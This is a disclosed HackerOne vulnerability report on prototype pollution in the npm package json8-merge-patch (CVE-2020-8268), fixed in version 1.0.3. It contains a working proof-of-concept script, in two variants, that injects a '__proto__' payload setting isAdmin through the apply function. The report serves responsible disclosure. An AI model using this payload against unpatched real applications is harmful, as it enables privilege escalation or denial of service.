---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/modification-of-assumed-immutable-data-maid
  - env/web
  - stack/node
substate: "resolved"
weakness: "Modification of Assumed-Immutable Data (MAID)"
enriched: true
body: true
date: 2020-10-18
submitted: 2020-09-12T11:53:16.089Z
bounty_usd: null
votes: 5
cve: "CVE-2020-8268"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "gkmr"
source: "https://hackerone.com/reports/980649"
title: "[json8-merge-patch] Prototype Pollution"
---
# [json8-merge-patch] Prototype Pollution

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 5 | **Program:** Node.js third-party modules | **Disclosed:** 2020-10-18

- Report: [https://hackerone.com/reports/980649](https://hackerone.com/reports/980649)
- CWE: Modification of Assumed-Immutable Data (MAID) | CVE: CVE-2020-8268
- Submitted: 2020-09-12T11:53:16.089Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a `Prototype Pollution` vulnerability in `json8-merge-patch`
The `apply` function fails to restrict access to prototypes of objects, allowing for modification of prototype behavior.

# Module

**module name:** `json8-merge-patch`
**version:** `v1.0.1`
**npm page:** `https://www.npmjs.com/package/json8-merge-patch`

## Module Description

JSON Merge Patch RFC 7396 toolkit for JavaScript.

## Module Stats

Weekly downloads: `517`

# Vulnerability

## Vulnerability Description

The `apply` function fails to restrict access to prototypes of objects, allowing for modification of prototype behavior, which may allow obtaining sensitive information/DoS/RCE.

## Steps To Reproduce:

1. Install `json8-merge-patch` module

     > `npm i json8-merge-patch`
2. create a file `poc.js` with content :
```
let json8mergepatch = require("json8-merge-patch");
var obj = {}
console.log("Before : " + obj.isAdmin);
json8mergepatch.apply(obj, JSON.parse('{ "__proto__": { "isAdmin": true }}'));
console.log("After : " + obj.isAdmin);
```
3. Execute using: `node poc.js`

##Output:
Before: undefined
After: true

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Windows 10
- NODEJS VERSION: v12.18.3
- NPM VERSION: 6.14.6

# Wrap up

- I contacted the maintainer to let them know: [Y] 
- I opened an issue in the related repository: [Y] 

Ref: https://github.com/sonnyp/JSON8/issues/113

## Impact

Can result in sensitive information disclosure/DoS/RCE. (depends on implementation)

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **Report Title Updated**
- **2020-09-13** @gkmr: The issue got resolved in 1.0.3. 
https://github.com/sonnyp/JSON8/pull/114
https://github.com/sonnyp/JSON8/pull/116

Can I request a CVE for this?
- **2020-09-13** @gkmr: The issue got fixed, so we can close and publish this. Fixed version 1.0.3
- **2020-09-18** @marcinhoppe: I verified that v1.0.1 is prone to prototype pollution using this slightly modified reproduction:

```javascript
let json8mergepatch = require("json8-merge-patch");
var obj = {}
console.log("Before : " + obj.isAdmin);
json8mergepatch.apply(obj, JSON.parse('{ "__proto__": { "isAdmin": true }}'));
var anotherObj = {};
console.log("After : " + anotherObj.isAdmin);
```

I also verified v1.0.3 is no longer vulnerable. I will resolve this report and request disclosure.
- **Report Vulnerability Types Updated**
- **Report Severity Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **2020-09-18** @gkmr: I reported this issue for a CVE, can I get a CVE for this issue?
- **Report Became Public**
- **Changed Scope**
